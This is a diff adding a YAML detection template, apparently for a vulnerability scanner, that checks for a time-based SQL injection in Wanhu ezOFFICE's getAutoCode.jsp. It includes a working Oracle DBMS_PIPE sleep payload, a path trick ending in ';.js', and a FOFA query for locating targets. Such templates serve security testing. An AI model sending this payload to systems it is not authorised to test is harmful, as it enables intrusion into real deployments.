@@ -1,0 +1,27 @@
+id: poc-yaml-wanhu-ezoffice-getautocode-sqli
+info:
+  name: 万户 ezOFFICE getAutoCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /defaultroot/login.jsp
+  expression: status_code == 200 && contains(body,"whirRootPath")
+- method: GET
+  path: /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C{{.t1}}%29--+YJdO&field=field_name&tabName=tfield
+  expression: 'status_code == 200 &&
+
+    trim(body) == "" &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
